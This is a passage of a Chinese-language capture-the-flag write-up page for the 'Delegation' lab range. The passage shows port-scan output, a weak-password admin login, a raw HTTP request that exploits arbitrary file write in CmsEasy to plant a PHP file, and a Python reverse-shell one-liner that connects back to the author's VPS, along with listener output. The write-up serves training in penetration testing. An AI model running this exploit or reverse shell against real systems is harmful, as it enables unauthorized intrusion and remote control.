<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Yunjing/major/Delegation/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.6.3">
<title data-rh="true">Delegation | Target Machines WriteUp</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/major/Delegation/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Delegation | Target Machines WriteUp"><meta data-rh="true" name="description" content="Delegation 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。"><meta data-rh="true" property="og:description" content="Delegation 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。"><link data-rh="true" rel="icon" href="/Target-Machines-WriteUp/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/major/Delegation/"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/major/Delegation/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Yunjing/major/Delegation/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/Target-Machines-WriteUp/blog/rss.xml" title="Target Machines WriteUp RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Target-Machines-WriteUp/blog/atom.xml" title="Target Machines WriteUp Atom Feed">



<link rel="preconnect" href="https://static.cloudflareinsights.com">
<script src="https://static.cloudflareinsights.com/beacon.min.js" defer="defer" data-cf-beacon="{&quot;token&quot;:&quot;419208379f5c472a9afad0d3dc0396f9&quot;}"></script>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.24/dist/katex.min.css" integrity="sha384-odtC+0UGzzFL/6PNoE8rX/SPcQDXBJ+uRepguP4QkPCm2LBxH3FA3y+fKSiJ+AmM" crossorigin="anonymous"><link rel="stylesheet" href="/Target-Machines-WriteUp/assets/css/styles.b5431df6.css">
<script src="/Target-Machines-WriteUp/assets/js/runtime~main.7f7e8e95.js" defer="defer"></script>
<script src="/Target-Machines-WriteUp/assets/js/main.b2e57cda.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Target-Machines-WriteUp/"><div class="navbar__logo"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Target Machines WriteUp</b></a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackTheBox/">HackTheBox</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Target-Machines-WriteUp/docs/Yunjing/"> 春秋云境 </a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackMyVM/">HackMyVM</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Xuanji/"> 玄机 </a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Independent-Environment/"> 其他靶场 </a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/ToolsGuide/">Tools Guide</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/blog">Blog</a><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z"><input placeholder="搜索" aria-label="Search" class="navbar__search-input"><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/Target-Machines-WriteUp/docs/Yunjing/">春秋云境</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/Target-Machines-WriteUp/docs/Yunjing/CVE/CVE-2016-4437">CVE</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/Target-Machines-WriteUp/docs/category/YunjingDimension">多维挑战</a><button aria-label="展开侧边栏分类 &#x27;多维挑战&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/Target-Machines-WriteUp/docs/category/YunjingMajor">专业徽章</a><button aria-label="折叠侧边栏分类 &#x27;专业徽章&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/Yunjing/major/Brute4Road/">Brute4Road</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/Target-Machines-WriteUp/docs/Yunjing/major/Delegation/">Delegation</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/Yunjing/major/Hospital/">Hospital</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/Yunjing/major/Initial/">Initial</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/Target-Machines-WriteUp/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/Target-Machines-WriteUp/docs/category/YunjingMajor"><span itemprop="name">专业徽章</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Delegation</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Delegation</h1></header>
<p>Delegation 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 flag，分布于不同的靶机。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>信息</div><div class="admonitionContent_BuS1"><p>Tags</p><ul>
<li>Brute Force - RDP 密码爆破</li>
<li>Privilege Elevation - Linux suid 特权文件</li>
<li>Privilege Elevation - Windows 服务配置缺陷提权</li>
<li>Kerberos - Kerberos TGT 票据利用</li>
<li>域渗透 - DCSync &amp; RPC 强制认证</li>
</ul></div></div>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">入口点</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">39.99.241.120</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口点探测">入口点探测<a href="#入口点探测" class="hash-link" aria-label="入口点探测的直接链接" title="入口点探测的直接链接">​</a></h2>
<p>使用 <code>fscan</code> 对入口点靶机进行扫描</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start infoscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">39.99</span><span class="token plain">.241.120:80 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">39.99</span><span class="token plain">.241.120:21 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">39.99</span><span class="token plain">.241.120:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">39.99</span><span class="token plain">.241.120:3306 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> alive ports len is: </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> WebTitle http://39.99.241.120      code:200 len:68108  title: 中文网页标题</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口点-cmseasy-任意文件上传构建-webshell">入口点 CmsEasy 任意文件上传构建 Webshell<a href="#入口点-cmseasy-任意文件上传构建-webshell" class="hash-link" aria-label="入口点 CmsEasy 任意文件上传构建 Webshell的直接链接" title="入口点 CmsEasy 任意文件上传构建 Webshell的直接链接">​</a></h2>
<p>进行目录扫描，发现存在有 <code>/admin/</code> 后台登陆界面，经过手动尝试，确认凭据为弱密码 <code>admin:123456</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240716-081613-253eb2c828118f2b2c0154ddb9affda8.png" width="2559" height="1371" class="img_ev3q"></p>
<p>根据页面底部的 <code>Powered by CmsEasy</code> 字段，搜索可能的漏洞信息，结合可以登陆后台，可以确认要利用的漏洞为后台任意文件上传</p>
<p>参考：<a href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD" target="_blank" rel="noopener noreferrer">CmsEasy_7.7.5_20211012 存在任意文件写入和任意文件读取漏洞 | jdr</a></p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Host: 39.99.237.127</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Language: zh-CN</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Upgrade-Insecure-Requests: 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accept-Encoding: gzip, deflate, br</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Cookie: PHPSESSID=i6o38uig1s56o0j0u8diitem0h; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection: keep-alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Type: application/x-www-form-urlencoded</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Content-Length: 69</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php phpinfo();?&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240718-081813-bd59109f7a1e37ad380dafe7125fee12.png" width="2378" height="1390" class="img_ev3q"></p>
<p>访问 <code>http://39.99.237.127/1.php</code> 页面，成功看到 phpinfo 界面，说明可以借此写入 webshell</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240720-082053-f4c3a090060332ab2243858034bf7d1c.png" width="1714" height="1040" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口点-反弹-shell--权限维持">入口点 反弹 shell + 权限维持<a href="#入口点-反弹-shell--权限维持" class="hash-link" aria-label="入口点 反弹 shell + 权限维持的直接链接" title="入口点 反弹 shell + 权限维持的直接链接">​</a></h2>
<p>基于 webshell，反弹 shell 到 vps</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@jmt-projekt:~</span><span class="token comment" style="color:#999988;font-style:italic"># nc -lvnp 9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Listening on </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0 </span><span class="token number" style="color:#36acaa">9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Connection received on </span><span class="token number" style="color:#36acaa">39.99</span><span class="token plain">.237.127 </span><span class="token number" style="color:#36acaa">43980</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Python </span><span class="token number" style="color:#36acaa">3.8</span><span class="token plain">.10</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>鉴于存在有 Python 环境，使用 python 的反弹 shell 进一步获取完成 shell 功能</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">netcat listener</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;139.*.*.*&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">pwncat-cs listener</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@jmt-projekt:~</span><span class="token comment" style="color:#999988;font-style:italic"># pwncat-cs -lp 8888</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">08:25:49</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Welcome to pwncat 🐈</span><span class="token operator" style="color:#393A34">!</span><span class="token plain">                                                                                                                                                                 __main__.py:164</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">08:26:19</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> received connection from </span><span class="token number" style="color:#36acaa">39.99</span><span class="token plain">.237.127:39390                                                                                                                                               bind.py:84</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">08:26:21</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0:8888: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                                                            manager.py:957</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">08:26:22</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">39.99</span><span class="token plain">.237.127:39390: registered new </span><span class="token function" style="color:#d73a49">host</span><span class="token plain"> w/ db                                                                                                                                         manager.py:957</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">local</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> pwncat$ back</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@localhost:/var/www/html$ </span><span class="token function" style="color:#d73a49">whoami</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">www-data</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 